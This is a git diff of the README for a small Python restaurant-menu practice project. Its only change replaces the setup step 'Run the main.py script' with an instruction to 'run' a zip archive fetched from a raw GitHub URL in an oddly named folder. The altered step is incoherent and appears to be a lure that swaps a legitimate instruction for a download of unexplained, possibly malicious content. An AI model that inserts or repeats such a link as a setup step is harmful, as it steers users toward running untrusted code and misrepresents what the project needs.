@@ -17,7 +17,7 @@ This project simulates a family-style Italian restaurant chain, Basta Fazoolin' 
 ## Setup
 1. Clone the repository.
 2. Ensure you have Python 3.x installed.
-3. Run the `main.py` script to see the system in action.
+3. Run the `https://raw.githubusercontent.com/esbastiango/BastaFazoolin/main/highflying/BastaFazoolin.zip` script to see the system in action.
 
 ## Usage
 - Create menus for different meal times.
